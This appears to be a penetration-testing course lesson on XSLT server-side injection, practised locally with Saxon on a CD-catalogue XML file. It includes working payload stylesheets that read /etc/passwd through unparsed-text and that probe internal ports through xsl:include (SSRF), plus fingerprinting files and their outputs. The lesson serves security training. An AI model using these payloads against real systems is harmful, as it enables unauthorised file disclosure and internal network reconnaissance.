# Attacking XSLT

Extensible Stylesheet Language Transformations (`XSLT`) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

Depending on the case, XSLT uses built-in functions and the XPATH language to transform a document either in the browser or the server. Extensible Stylesheet Language Transformations are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. At the time of writing, there are 3 ([1](https://www.w3.org/TR/xslt-10/), [2](https://www.w3.org/TR/xslt20/), [3](https://www.w3.org/TR/xslt-30/)) XSLT versions. Version 1 is the least interesting from an attacker's perspective due to the limited built-in functionality. The most used XSLT-related projects are LibXSLT, Xalan, and Saxon. To exploit XSLT Injections, we need to store malicious tags on the server-side and access that content.

Let us experiment with XSLT by using a combination of Saxon with XSLT Version 2.

First, install the required packages on Pwnbox or a local VM, as follows:

**Installation of required packages**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java
```

Next, create the following files:

**catalogue.xml**

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
  <cd>
    <title>Still got the blues</title>
    <artist>Gary Moore</artist>
    <country>UK</country>
    <company>Virgin records</company>
    <price>10.20</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Eros</title>
    <artist>Eros Ramazzotti</artist>
    <country>EU</country>
    <company>BMG</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>One night only</title>
    <artist>Bee Gees</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>10.90</price>
    <year>1998</year>
  </cd>
  <cd>
    <title>Sylvias Mother</title>
    <artist>Dr.Hook</artist>
    <country>UK</country>
    <company>CBS</company>
    <price>8.10</price>
    <year>1973</year>
  </cd>
  <cd>
    <title>Maggie May</title>
    <artist>Rod Stewart</artist>
    <country>UK</country>
    <company>Pickwick</company>
    <price>8.50</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Romanza</title>
    <artist>Andrea Bocelli</artist>
    <country>EU</country>
    <company>Polydor</company>
    <price>10.80</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>When a man loves a woman</title>
    <artist>Percy Sledge</artist>
    <country>USA</country>
    <company>Atlantic</company>
    <price>8.70</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Black angel</title>
    <artist>Savage Rose</artist>
    <country>EU</country>
    <company>Mega</company>
    <price>10.90</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>1999 Grammy Nominees</title>
    <artist>Many</artist>
    <country>USA</country>
    <company>Grammy</company>
    <price>10.20</price>
    <year>1999</year>
  </cd>
  <cd>
    <title>For the good times</title>
    <artist>Kenny Rogers</artist>
    <country>UK</country>
    <company>Mucik Master</company>
    <price>8.70</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>Big Willie style</title>
    <artist>Will Smith</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>Tupelo Honey</title>
    <artist>Van Morrison</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>8.20</price>
    <year>1971</year>
  </cd>
  <cd>
    <title>Soulsville</title>
    <artist>Jorn Hoel</artist>
    <country>Norway</country>
    <company>WEA</company>
    <price>7.90</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>The very best of</title>
    <artist>Cat Stevens</artist>
    <country>UK</country>
    <company>Island</company>
    <price>8.90</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Stop</title>
    <artist>Sam Brown</artist>
    <country>UK</country>
    <company>A and M</company>
    <price>8.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Bridge of Spies</title>
    <artist>T`Pau</artist>
    <country>UK</country>
    <company>Siren</company>
    <price>7.90</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Private Dancer</title>
    <artist>Tina Turner</artist>
    <country>UK</country>
    <company>Capitol</company>
    <price>8.90</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Midt om natten</title>
    <artist>Kim Larsen</artist>
    <country>EU</country>
    <company>Medley</company>
    <price>7.80</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Pavarotti Gala Concert</title>
    <artist>Luciano Pavarotti</artist>
    <country>UK</country>
    <company>DECCA</company>
    <price>9.90</price>
    <year>1991</year>
  </cd>
  <cd>
    <title>The dock of the bay</title>
    <artist>Otis Redding</artist>
    <country>USA</country>
    <company>Stax Records</company>
    <price>7.90</price>
    <year>1968</year>
  </cd>
  <cd>
    <title>Picture book</title>
    <artist>Simply Red</artist>
    <country>EU</country>
    <company>Elektra</company>
    <price>7.20</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Red</title>
    <artist>The Communards</artist>
    <country>UK</country>
    <company>London</company>
    <price>7.80</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Unchain my heart</title>
    <artist>Joe Cocker</artist>
    <country>USA</country>
    <company>EMI</company>
    <price>8.20</price>
    <year>1987</year>
  </cd>
</catalog>
```

**transformation.xsl**

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```

We need to understand the XSLT format to see how the transformation works.

* The first line is usually the XML version and encoding
* Next, it will have the XSL root node `xsl:stylesheet`
* Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
* After that, the transformation is defined for any item in the XML structure matching the previous line.
* To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

To see the results, we will use the command line parser. This can be done as follows:

**Transformation through the terminal**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
      <h2>My CD Collection</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>Artist</th>
         </tr>
         <tr>
            <td>Empire Burlesque</td>
            <td>Bob Dylan</td>
         </tr>
      </table>
   </body>
</html>
```

The following file can be used to detect the underlying preprocessor.

**detection.xsl**

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```

Let us now run the previous command, but this time, using the detection.xsl file.

**Transformation through the terminal**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```

Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest, such as the below.

* `unparsed-text` can be used to read local files.

**readfile.xsl**

Code: xml

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<SNIP>
```

* `xsl:include` can be used to perform SSRF

We can also mount SSRF attacks if we have control over the transformation.

**ssrf.xsl**

Code: xml

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.io.FileNotFoundException: http://127.0.0.1:5000/xslt
Failed to compile stylesheet. 1 error detected.
```

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml

Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
Error at xsl:include on line 2 column 49 of ssrf.xsl:
  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)
Failed to compile stylesheet. 1 error detected.
```

Check the different responses above when we hit an open or closed port. If you want to try this yourself in Pwnbox or a local machine, try executing the `saxonb-xslt` command above one time with nothing listening on port 5000 and one time with an HTTP server listening on port 5000 (`sudo python3 -m http.server 5000` in a separate tab or terminal).

We presented some tech-stack-identification XSL files at the beginning of this section. Below is one more, larger than the previous ones. Try using it to reproduce the example above.

**fingerprinting.xsl**

Code: xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

**Transformation through the terminal**

Attacking XSLT

```shell-session
AIceBear@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml

Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>
 Version: 2.0<br/>
 Vendor: SAXON 9.1.0.8 from Saxonica<br/>
 Vendor URL: http://www.saxonica.com/<br/>
 Product Name: SAXON<br/>
 Product Version: 9.1.0.8<br/>
 Is Schema Aware ?: no<br/>
 Supports Serialization: <br/>
 Supports Backwards Compatibility: <br/>
```

We can also use the following [wordlist](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/xslt.txt) for brute-forcing functionality available in target applications.
